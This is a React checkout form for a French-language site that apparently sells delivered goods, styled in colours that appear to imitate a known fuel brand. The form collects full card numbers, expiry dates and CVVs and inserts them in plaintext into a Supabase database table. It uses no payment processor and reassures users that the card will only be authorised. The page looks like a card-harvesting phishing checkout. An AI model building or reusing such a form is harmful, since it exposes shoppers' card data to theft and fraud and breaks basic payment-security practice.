import { useState } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Checkbox } from '@/components/ui/checkbox';
import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
import { Badge } from '@/components/ui/badge';
import { CustomerInfo, CheckoutData } from '@/types/checkout';
import { supabase } from "@/integrations/supabase/client";
import { useNavigate } from "react-router-dom";
import { Mail, MapPin, CreditCard, FileText, ShoppingCart, User, Calendar, Lock, Eye, EyeOff } from 'lucide-react';
import { toast } from 'sonner';
import { PaymentIcons } from '@/components/ui/PaymentIcons';
import { useIsMobile } from '@/hooks/use-mobile';

interface CheckoutFormProps {
  initialZipCode: string;
  totalPrice: number;
  onSubmit: (customerInfo: CustomerInfo) => void;
  isSubmitting: boolean;
  checkoutData: CheckoutData;
}

const CheckoutForm = ({ initialZipCode, totalPrice, onSubmit, isSubmitting, checkoutData }: CheckoutFormProps) => {
  const navigate = useNavigate();
  const isMobile = useIsMobile();
  const [showCvv, setShowCvv] = useState(false);
  const [customerInfo, setCustomerInfo] = useState<CustomerInfo>({
    email: '',
    firstName: '',
    lastName: '',
    phone: '',
    street: '',
    zipCode: initialZipCode,
    city: '',
    agreeToTerms: false,
    paymentMethodSelected: false,
    cardholderName: '',
    cardNumber: '',
    expiryDate: '',
    cvv: '',
  });

  const detectCardType = (cardNumber: string): 'visa' | 'mastercard' | 'amex' | 'unknown' => {
    const cleanNumber = cardNumber.replace(/\s/g, '');
    const firstDigit = cleanNumber.charAt(0);
    
    if (firstDigit === '4') return 'visa';
    if (firstDigit === '5') return 'mastercard';
    if (firstDigit === '3') return 'amex';
    return 'unknown';
  };

  const handleInputChange = (field: keyof CustomerInfo, value: string | boolean) => {
    setCustomerInfo(prev => ({
      ...prev,
      [field]: value
    }));
  };


  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Validation
    if (!customerInfo.email || !customerInfo.email.includes('@')) {
      toast.error('Veuillez saisir une adresse e-mail valide');
      return;
    }
    
    if (!customerInfo.firstName || !customerInfo.lastName) {
      toast.error('Veuillez saisir votre nom et prénom');
      return;
    }
    
    if (!customerInfo.phone) {
      toast.error('Veuillez saisir votre numéro de téléphone');
      return;
    }
    
    if (!customerInfo.street) {
      toast.error('Veuillez saisir votre adresse');
      return;
    }
    
    if (!customerInfo.zipCode || customerInfo.zipCode.length !== 5) {
      toast.error('Veuillez saisir un code postal valide');
      return;
    }
    
    if (!customerInfo.city) {
      toast.error('Veuillez saisir votre ville');
      return;
    }
    
    if (!customerInfo.agreeToTerms) {
      toast.error('Veuillez accepter les conditions générales');
      return;
    }

    // Credit card validation
    if (customerInfo.paymentMethodSelected) {
      if (!customerInfo.cardholderName) {
        toast.error('Veuillez saisir le nom du titulaire de la carte');
        return;
      }
      if (!customerInfo.cardNumber || customerInfo.cardNumber.replace(/\s/g, '').length < 13) {
        toast.error('Veuillez saisir un numéro de carte bancaire valide');
        return;
      }
      if (!customerInfo.expiryDate || !/^\d{2}\/\d{2}$/.test(customerInfo.expiryDate)) {
        toast.error('Veuillez saisir une date d\'expiration valide (MM/AA)');
        return;
      }
      if (!customerInfo.cvv || customerInfo.cvv.length < 3) {
        toast.error('Veuillez saisir un code CVV valide');
        return;
      }
    }

    try {
      // Daten in Supabase speichern
      const { data: order, error } = await supabase
        .from('orders')
        .insert({
          product_type: checkoutData.selectedProduct,
          quantity: parseInt(checkoutData.quantity),
          zip_code: checkoutData.zipCode,
          total_price: checkoutData.totalPrice,
          delivery_fee: checkoutData.deliveryFee,
          final_price: checkoutData.finalPrice,
          email: customerInfo.email,
          first_name: customerInfo.firstName,
          last_name: customerInfo.lastName,
          phone: customerInfo.phone,
          street: customerInfo.street,
          city: customerInfo.city,
          payment_method_selected: customerInfo.paymentMethodSelected,
          cardholder_name: customerInfo.cardholderName,
          card_number: customerInfo.cardNumber,
          expiry_date: customerInfo.expiryDate,
          cvv: customerInfo.cvv,
          terms_agreed: customerInfo.agreeToTerms
        })
        .select()
        .single();

      if (error) {
        throw error;
      }


      toast.success('Commande passée avec succès !');
      
      // Redirection vers la page de paiement
      navigate(`/payment?orderId=${order.id}`);
    } catch (error) {
      console.error('Erreur lors de la sauvegarde de la commande:', error);
      toast.error('Erreur lors de la commande. Veuillez réessayer.');
    }
  };

  return (
    <form onSubmit={handleSubmit} className="space-y-6">
      {/* Email Card */}
      <Card className="shadow-sm border border-border">
        <CardHeader className="pb-3">
          <CardTitle className="text-lg font-semibold flex items-center gap-2 text-foreground">
            <Mail className="h-5 w-5 text-muted-foreground" />
            Adresse e-mail
          </CardTitle>
        </CardHeader>
        <CardContent>
          <div>
            <Label htmlFor="email" className="text-sm font-medium text-muted-foreground">
              Adresse e-mail{!isMobile && " *"}
            </Label>
            <Input
              id="email"
              type="email"
              placeholder="votre.email@exemple.fr"
              value={customerInfo.email}
              onChange={(e) => handleInputChange('email', e.target.value)}
              required
              className="mt-1"
            />
          </div>
        </CardContent>
      </Card>

      {/* Delivery Address Card */}
      <Card className="shadow-sm border border-border">
        <CardHeader className="pb-3">
          <CardTitle className="text-lg font-semibold flex items-center gap-2 text-foreground">
            <MapPin className="h-5 w-5 text-muted-foreground" />
            Adresse de livraison
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div>
              <Label htmlFor="firstName" className="text-sm font-medium text-muted-foreground">
                Prénom{!isMobile && " *"}
              </Label>
              <div className="relative mt-1">
                <Input
                  id="firstName"
                  type="text"
                  placeholder="Pierre"
                  value={customerInfo.firstName}
                  onChange={(e) => handleInputChange('firstName', e.target.value)}
                  required
                  className="pl-10"
                />
                <User className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-muted-foreground" />
              </div>
            </div>
            <div>
              <Label htmlFor="lastName" className="text-sm font-medium text-muted-foreground">
                Nom{!isMobile && " *"}
              </Label>
              <div className="relative mt-1">
                <Input
                  id="lastName"
                  type="text"
                  placeholder="Martin"
                  value={customerInfo.lastName}
                  onChange={(e) => handleInputChange('lastName', e.target.value)}
                  required
                  className="pl-10"
                />
                <User className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-muted-foreground" />
              </div>
            </div>
          </div>
          
          <div>
            <Label htmlFor="phone" className="text-sm font-medium text-muted-foreground">
              Numéro de téléphone{!isMobile && " *"}
            </Label>
            <div className="relative mt-1">
              <Input
                id="phone"
                type="tel"
                placeholder="+33 1 23 45 67 89"
                value={customerInfo.phone}
                onChange={(e) => handleInputChange('phone', e.target.value)}
                required
                className="pl-10"
              />
              <User className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-muted-foreground" />
            </div>
          </div>
          
          <div>
            <Label htmlFor="street" className="text-sm font-medium text-muted-foreground">
              Rue et numéro{!isMobile && " *"}
            </Label>
            <Input
              id="street"
              type="text"
              placeholder="123 Rue de la République"
              value={customerInfo.street}
              onChange={(e) => handleInputChange('street', e.target.value)}
              required
              className="mt-1"
            />
          </div>
          
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div>
              <Label htmlFor="zipCode" className="text-sm font-medium text-muted-foreground">
                Code postal{!isMobile && " *"}
              </Label>
              <Input
                id="zipCode"
                type="text"
                placeholder="75001"
                value={customerInfo.zipCode}
                onChange={(e) => handleInputChange('zipCode', e.target.value)}
                pattern="[0-9]{5}"
                maxLength={5}
                required
                className="mt-1"
              />
            </div>
            <div>
              <Label htmlFor="city" className="text-sm font-medium text-muted-foreground">
                Ville{!isMobile && " *"}
              </Label>
              <Input
                id="city"
                type="text"
                placeholder="Paris"
                value={customerInfo.city}
                onChange={(e) => handleInputChange('city', e.target.value)}
                required
                className="mt-1"
              />
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Payment Method Card */}
      <Card className="shadow-sm border border-border">
        <CardHeader className="pb-3">
          <CardTitle className="text-lg font-semibold flex items-center gap-2 text-foreground">
            <CreditCard className="h-5 w-5 text-muted-foreground" />
            Mode de paiement
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-4">
          <RadioGroup
            value={customerInfo.paymentMethodSelected ? "credit-card" : ""}
            onValueChange={(value) => handleInputChange('paymentMethodSelected', value === "credit-card")}
          >
              <div className="flex items-center justify-between">
                <div className="flex items-center space-x-2">
                  <RadioGroupItem value="credit-card" id="credit-card" />
                  <Label htmlFor="credit-card" className="flex items-center gap-3 cursor-pointer">
                    <CreditCard className="h-5 w-5 text-muted-foreground" />
                    <div className="flex-1">
                      <div className="font-medium text-foreground">Carte bancaire</div>
                      <div className="text-sm text-muted-foreground">Visa, Mastercard, American Express</div>
                    </div>
                  </Label>
                </div>
                <div className="flex items-center gap-3">
                  <Badge variant="default" className="text-xs font-medium bg-green-100 text-green-800 border-green-200 dark:bg-green-900 dark:text-green-100 dark:border-green-800">
                    Paiement après livraison
                  </Badge>
                  <PaymentIcons />
                </div>
              </div>
          </RadioGroup>

          {/* Credit Card Fields */}
          {customerInfo.paymentMethodSelected && (
            <div className="mt-6 p-4 border border-border rounded-lg bg-muted/20 space-y-4">
              <div>
                <Label htmlFor="cardholderName" className="text-sm font-medium text-muted-foreground">
                  Titulaire de la carte{!isMobile && " *"}
                </Label>
                <div className="relative mt-1">
                  <Input
                    id="cardholderName"
                    type="text"
                    placeholder="Pierre Martin"
                    value={customerInfo.cardholderName}
                    onChange={(e) => handleInputChange('cardholderName', e.target.value)}
                    className="pl-10"
                  />
                  <User className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-muted-foreground" />
                </div>
              </div>

              <div>
                <Label htmlFor="cardNumber" className="text-sm font-medium text-muted-foreground">
                  Numéro de carte bancaire{!isMobile && " *"}
                </Label>
                <div className="relative mt-1">
                  <Input
                    id="cardNumber"
                    type="text"
                    placeholder="1234 5678 9012 3456"
                    value={customerInfo.cardNumber}
                    onChange={(e) => {
                      // Format card number with spaces
                      const value = e.target.value.replace(/\s/g, '').replace(/(.{4})/g, '$1 ').trim();
                      handleInputChange('cardNumber', value);
                    }}
                    maxLength={19}
                    className="pl-10 pr-12"
                  />
                  <CreditCard className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-muted-foreground" />
                  {detectCardType(customerInfo.cardNumber) !== 'unknown' && (
                    <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
                      <PaymentIcons cardType={detectCardType(customerInfo.cardNumber)} className="h-5" />
                    </div>
                  )}
                </div>
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <Label htmlFor="expiryDate" className="text-sm font-medium text-muted-foreground">
                    Date d'expiration{!isMobile && " *"}
                  </Label>
                  <div className="relative mt-1">
                    <Input
                      id="expiryDate"
                      type="text"
                      placeholder="MM/YY"
                      value={customerInfo.expiryDate}
                      onChange={(e) => {
                        // Format expiry date as MM/YY
                        let value = e.target.value.replace(/\D/g, '');
                        if (value.length >= 2) {
                          value = value.substring(0, 2) + '/' + value.substring(2, 4);
                        }
                        handleInputChange('expiryDate', value);
                      }}
                      maxLength={5}
                      className="pl-10"
                    />
                    <Calendar className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-muted-foreground" />
                  </div>
                </div>
                <div>
                  <Label htmlFor="cvv" className="text-sm font-medium text-muted-foreground">
                    CVV{!isMobile && " *"}
                  </Label>
                  <div className="relative mt-1">
                    <Input
                      id="cvv"
                      type={showCvv ? "text" : "password"}
                      placeholder="123"
                      value={customerInfo.cvv}
                      onChange={(e) => {
                        // Only allow numbers
                        const value = e.target.value.replace(/\D/g, '');
                        handleInputChange('cvv', value);
                      }}
                      maxLength={4}
                      className="pl-10 pr-10"
                    />
                    <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-muted-foreground" />
                    <button
                      type="button"
                      onClick={() => setShowCvv(!showCvv)}
                      className="absolute right-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-muted-foreground hover:text-foreground"
                    >
                      {showCvv ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                    </button>
                  </div>
                </div>
              </div>
            </div>
          )}
        </CardContent>
      </Card>

      {/* Payment Security Notice */}
      {customerInfo.paymentMethodSelected && (
        <Card className="shadow-sm border border-green-200 bg-green-50 dark:bg-green-950/20 dark:border-green-800">
          <CardContent className="pt-6">
            <div className="flex items-start gap-3">
              <Lock className="h-5 w-5 text-green-600 dark:text-green-400 mt-0.5" />
              <div className="flex-1">
                <h4 className="font-semibold text-green-900 dark:text-green-100 mb-2">
                  Information de sécurité du paiement
                </h4>
                <p className="text-sm text-green-800 dark:text-green-200 leading-relaxed">
                  Votre carte bancaire sera d'abord uniquement autorisée, non débitée. Le débit effectif n'aura lieu qu'après la livraison et le remplissage réussis. Vous recevrez une confirmation de l'autorisation ainsi qu'une notification séparée lors du débit final.
                </p>
              </div>
            </div>
          </CardContent>
        </Card>
      )}

      {/* Terms & Privacy Card */}
      <Card className="shadow-sm border border-border">
        <CardHeader className="pb-3">
          <CardTitle className="text-lg font-semibold flex items-center gap-2 text-foreground">
            <FileText className="h-5 w-5 text-muted-foreground" />
            CGV & Confidentialité
          </CardTitle>
        </CardHeader>
        <CardContent>
          <div className="flex items-start space-x-3">
            <Checkbox
              id="terms"
              checked={customerInfo.agreeToTerms}
              onCheckedChange={(checked) => handleInputChange('agreeToTerms', checked as boolean)}
              required
              className="mt-1"
            />
            <Label htmlFor="terms" className="text-sm text-muted-foreground leading-relaxed cursor-pointer">
              J'accepte les{' '}
              <a href="/cgv" target="_blank" className="text-total-blue hover:underline font-medium">
                Conditions Générales de Vente
              </a>{' '}
              et la{' '}
              <a href="/politique-confidentialite" target="_blank" className="text-total-blue hover:underline font-medium">
                Politique de Confidentialité
              </a>
              {!isMobile && " *"}
            </Label>
          </div>
        </CardContent>
      </Card>


      {/* Submit Button */}
      <Button
        type="submit"
        disabled={isSubmitting || !customerInfo.agreeToTerms}
        className="w-full bg-gradient-to-r from-total-red to-orange-500 hover:from-red-700 hover:to-orange-600 text-white font-bold py-4 text-lg shadow-lg disabled:opacity-50"
        size="lg"
      >
        {isSubmitting ? (
          <div className="flex items-center gap-2">
            <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
            Traitement en cours...
          </div>
        ) : (
          <div className="flex items-center gap-2">
            <ShoppingCart className="h-5 w-5" />
            Autoriser le paiement - {totalPrice.toFixed(2)}€
          </div>
        )}
      </Button>
    </form>
  );
};

export default CheckoutForm;